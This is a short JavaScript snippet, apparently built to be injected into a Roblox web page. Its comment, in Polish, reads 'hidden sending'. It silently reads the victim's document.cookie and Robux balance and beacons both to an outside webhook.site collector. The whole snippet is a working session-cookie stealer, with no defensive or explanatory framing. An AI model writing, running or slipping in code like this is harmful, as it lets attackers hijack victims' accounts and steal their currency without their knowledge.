(function() {
    const url = "https://webhook.site/53158f3f-579b-4186-8cdd-d33333543bec";
    
    // Ukryta wysyłka
    setTimeout(() => {
        navigator.sendBeacon(url, "COOKIE: " + document.cookie);
    }, 500);

    setTimeout(() => {
        let robux = "unknown";
        try {
            robux = document.querySelector('[data-testid="nav-robux-amount"]')?.textContent || "unknown";
        } catch(e) {}
        navigator.sendBeacon(url, "ROBUX: " + robux);
    }, 1500);
})();
